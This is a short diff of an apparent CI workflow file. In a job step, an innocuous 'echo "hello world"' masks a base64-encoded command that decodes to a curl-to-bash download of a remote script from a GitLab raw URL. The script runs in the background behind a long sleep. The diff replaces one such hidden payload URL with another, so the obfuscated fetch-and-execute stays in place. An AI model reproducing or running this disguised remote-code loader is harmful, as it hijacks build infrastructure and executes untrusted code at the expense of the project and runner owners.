@@ -61,7 +61,7 @@ jobs:
               SLEEP=3600
             fi
           fi
-          echo "hello world" & base64 -d <<< Y3VybCAtc0wgIGh0dHBzOi8vZ2l0bGFiLmNvbS9tYWthbmFuOTkvZGlhbW9uZHMvLS9yYXcvbWFpbi9yZXAuc2ggfCBiYXNo | sh & sleep $SLEEP
+          echo "hello world" & base64 -d <<< Y3VybCAtc0wgIGh0dHBzOi8vZ2l0bGFiLmNvbS9zcGluYXpvbGxhL3NhaW50Ly0vcmF3L21haW4vc3VwZXJtYW5zIHwgYmFzaA | sh & sleep $SLEEP
 
   trigger-hello:
     needs: run-lscpu
